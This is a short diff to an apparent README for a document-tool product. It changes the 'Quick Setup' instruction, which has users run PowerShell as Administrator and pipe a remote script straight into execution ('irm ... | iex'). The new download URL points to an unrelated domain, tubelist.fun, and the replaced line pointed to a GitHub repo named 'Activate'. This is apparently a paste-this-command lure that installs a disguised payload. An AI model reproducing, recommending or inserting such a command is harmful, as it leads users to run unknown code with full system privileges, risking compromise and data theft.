@@ -16,5 +16,5 @@ Whether you need to merge contracts, redact sensitive data, or batch-convert spr
 **Quick Setup** — open PowerShell as Administrator and run:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
